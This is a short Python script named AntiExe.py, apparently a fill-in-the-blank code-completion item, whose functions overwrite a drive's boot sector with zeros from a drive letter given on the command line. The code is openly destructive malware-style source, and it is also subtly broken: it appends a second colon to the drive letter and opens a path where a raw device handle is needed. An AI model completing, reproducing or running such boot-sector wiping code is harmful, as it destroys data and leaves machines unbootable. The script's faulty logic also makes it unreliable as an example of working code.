import os
import struct
import sys

def read_boot_sector(drive):
    <FILL_HERE>
def write_boot_sector(drive, data):
    """
    Writes data to the boot sector of the specified drive.

    :param drive: The drive letter (e.g., 'C:')
    :param data: The data to write to the boot sector.
    """
    with open(drive + ':\\', 'r+b') as f:
        f.write(data)

def zero_out_boot_sector(drive):
    """
    Zeros out the boot sector of the specified drive.

    :param drive: The drive letter (e.g., 'C:')
    """
    boot_sector = b'\x00' * 512
    write_boot_sector(drive, boot_sector)

def main():
    if len(sys.argv) != 2:
        print("Usage: python AntiExe.py <drive_letter>")
        sys.exit(1)

    drive = sys.argv[1]
    if not drive.endswith(':'):
        print("Please provide a valid drive letter (e.g., 'C').")
        sys.exit(1)

    print(f"Zeroing out the boot sector of {drive}:\\")
    zero_out_boot_sector(drive)
    print("Boot sector has been zeroed out.")

if __name__ == "__main__":
    main()